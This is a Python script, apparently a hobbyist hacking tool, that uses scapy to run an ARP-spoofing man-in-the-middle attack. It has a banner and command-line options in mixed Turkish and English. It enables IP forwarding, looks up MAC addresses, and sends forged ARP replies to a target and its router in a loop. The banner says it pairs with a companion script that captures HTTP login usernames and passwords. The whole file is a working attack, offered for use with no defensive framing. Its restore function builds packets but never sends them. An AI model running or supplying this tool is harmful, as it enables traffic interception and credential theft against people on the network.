import os
import time
import scapy.all as scapy
import optparse

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("""  
                        |--------------------------------------|
                        |        Welcome the M1dB0th           |
                        |       Developed By SweatherX         |
                        |--------------------------------------|
    Kullanım:
            -t or --target [Target IP], -r or --host [Target Modem IP]
            Çıkış: Ctrl+C
                 
                 
   

    Note:
            Before your "datanlyzer.py" the MITM attack before the attack.
            If you want to login to a target http site, the username and password appear in the "file.

  
    """)
def giris():
    parse = optparse.OptionParser()

    parse.add_option("-t","--target",dest="hedef_ip",help="Enter target ip.")
    parse.add_option("-r","--host",dest="modem_ip",help="Enter taregt modem ip.")

    ayarlar = parse.parse_args()[0]

    if not ayarlar.hedef_ip:
        print("Enter target ip.")
    if not ayarlar.modem_ip:
        print("Enter taregt modem ip.")
    return ayarlar

def macbulucu(ip):
    istek_paket = scapy.ARP(pdst=ip)
    yayin_paket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    paket = yayin_paket/istek_paket
    asilpaket = scapy.srp(paket,timeout=1,verbose=False)[0]
    return asilpaket[0][1].hwsrc

def arpas(ip1,ip2):
    macbulduk = macbulucu(ip1)
    arp_as = scapy.ARP(op=2,pdst=ip1,hwdst=macbulduk,psrc=ip2)
    scapy.send(arp_as,verbose=False)
def reset(ip11,ip22):
    macbulduk = macbulucu(ip11)
    digermac = macbulucu(ip22)
    arp_as = scapy.ARP(op=2,pdst=ip11,hwdst=macbulduk,psrc=ip22,hwsrc=digermac)
sayac=0

girdi = giris()
hedef = girdi.hedef_ip
modem = girdi.modem_ip

try:
    while True:

        arpas(hedef,modem)
        arpas(modem,hedef)

        sayac += 2
        print("\Sended Packages : "+ str(sayac),end="")
        time.sleep(1)

except KeyboardInterrupt :
    print("\nQuiting...")
    reset(hedef,modem)
    reset(modem,hedef)


